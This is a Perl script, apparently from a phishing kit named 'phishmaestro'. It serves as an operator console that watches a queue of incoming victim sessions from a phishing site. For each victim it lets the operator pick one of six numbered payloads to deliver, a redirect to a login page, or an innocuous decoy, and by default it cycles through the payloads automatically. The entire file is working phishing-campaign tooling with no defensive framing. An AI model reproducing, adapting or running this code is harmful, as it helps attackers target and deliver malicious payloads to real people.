#!/usr/bin/perl
use File::Copy;

# Configure this to the total number of payloads
# you have created
$maxPayload = "6";


$webURL = 'https://www.THEDOMAIN.com';
$webDIR = '/var/www/html';
$pmDIR = "phishmaestro";

$failedLoginURL = "$webURL/login.htm";

# Phishing Site Parameters
$loginURL =  $webURL . "/index.html"; 
$queueDir =  "$webDIR/$pmDIR/sessions-queue"; 
$actionsDir = "$webDIR/$pmDIR/session-actions";
$payloadDir = "$webDIR/$pmDIR/payloads";

$logDir = "$webDIR/$pmDIR/log-sessions";

#payloadCounter used to 'auto-iterate' through payloads
$payloadCounter = '1';
 
while(true)
{
 # Watch the QUEUE Directory for new files
 @queueFiles = <$queueDir/*>;
  
 #while (my $line = <$data>) {
 foreach my $file (@queueFiles) 
 {
  open $fh, '<', $file or print "Can't open file $!";
  $queueFileName = $file;
  # probably add a continue here or something if it fails

  $lines = do { local $/; <$fh> };
  $waitingSessionLine = $lines;

  my @fields = split "\n" , $waitingSessionLine;
  $waitingSessID = $fields[0];
  #print "SESSION ID: $waitingSessID\n";

  $sessionAlreadyDone = "false";
  $sessionFileName = $actionsDir . "/$waitingSessID";

  if ( open( $sessData, '<', $sessionFileName))
  {
  	print "Already chose action for session $waitingSessID\n";
  	$sessionAlreadyDone = "true";
  	close($sessData);
  	close ($fh);
  	# Move session queue file to logs directory
  }

  if ( $sessionAlreadyDone eq "false")
  {
  		print "\a";
  	    print "\nSession: $waitingSessionLine\n\n";
	    #@wFields = split",",$waitingSessionLine;

	    #print "[1] Send Payload 1\n[2] Send Payload 2\n";
	    #	print "[3] Send Payload 3\n[4] Send Payload 4\n";
	    print "[x] Send payload number X (1-6)\n";
  		print "[l] Send to login page\n[i] Send Innocuous Payload\n";
	    print "[Default]: Payload $payloadCounter\n";

  		print "How would you like to handle this Jamoke: ";

  		my $action = <STDIN>;
  		chomp $action;

      #print "Action is '$action'\n";
      if ($action eq "")
      { 
        $action = "payload-$payloadCounter";
        print "Auto Payload: $action\n";
        $writeAction = "$action"; 
        $payloadCounter++;
        # Max payload is 4, so if last one sent is 4
        # then start back at 1
        if($payloadCounter == $maxPayload) { $payloadCounter =1}
      }

      if ( $action =~ /^[0-9]+$/ ) {      
       #print "$action is a number\n";
       $writeAction = "payload-$action"; 
      }

  		if ($action eq "l")
  		{ $writeAction = 'redirect-to-login'; }
  		if ($action eq "i")
  		{ $writeAction = 'innocuous-payload'; }


		#print "Creating file $sessionFileName\n";
  		open( $sessOut, '>>', $sessionFileName) or die;
  		$writeOut = "$waitingSessID,$writeAction\n";
  		print $sessOut $writeOut;
  		close($sessOut);
  		close($fh);

  		$logFileName = $logDir . "/$waitingSessID";

  		move( $queueFileName, $logFileName) or die "move failed: $!";
  }  	

  	print "\033[2J";   #clear the screen
	print "\033[0;0H"; #jump to 0,0
 } 


}

